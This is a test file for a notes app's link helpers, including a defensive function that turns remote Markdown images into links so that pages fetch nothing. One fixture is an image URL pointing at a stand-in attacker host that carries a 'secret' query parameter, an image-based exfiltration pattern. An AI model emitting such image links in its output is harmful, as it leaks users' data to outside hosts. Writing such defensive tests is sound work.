import { hrefFor, pageOf, remoteImagesAsLinks } from "@/components/notes/links";

describe("links in notes", () => {
  it("open the thing in the app", () => {
    expect(hrefFor("page:3")).toBe("/notes/3");
    expect(hrefFor("recording:12")).toBe("/resources/12");
    expect(hrefFor("entity:5", "pods")).toBe("/entities?entity=5&ns=pods");
    expect(hrefFor("topic:2", "pods")).toBe("/topics/2");
    expect(hrefFor("speaker:7")).toBe("/speakers/7");
    expect(hrefFor("collection:4", "pods")).toBe("/library?namespace=pods&collection=4");
  });

  it("ignore what isn't a link to Lens", () => {
    expect(hrefFor("https://example.com")).toBeNull();
    expect(hrefFor("entity:x")).toBeNull();
    expect(hrefFor("thing:3")).toBeNull();
  });

  it("find a thing's page", () => {
    expect(pageOf("entity:5")).toBe("/notes/about/entity/5");
  });
});

describe("remoteImagesAsLinks", () => {
  it("turns web images into links, so opening a page fetches nothing", () => {
    expect(remoteImagesAsLinks("Look ![chart](https://evil.example/?q=secret) here")).toBe(
      "Look [chart](https://evil.example/?q=secret) here",
    );
    expect(remoteImagesAsLinks('![x](http://a.example/i.png "title")')).toBe('[x](http://a.example/i.png "title")');
    expect(remoteImagesAsLinks("![x][ref]\n\n[ref]: https://a.example/i.png")).toBe(
      "[x][ref]\n\n[ref]: https://a.example/i.png",
    );
  });

  it("leaves other Markdown alone", () => {
    const md = "# Title\n\n[a link](https://a.example) and ![](data:image/png;base64,AAAA) and @[Ada](entity:5)";
    expect(remoteImagesAsLinks(md)).toBe(md);
  });
});
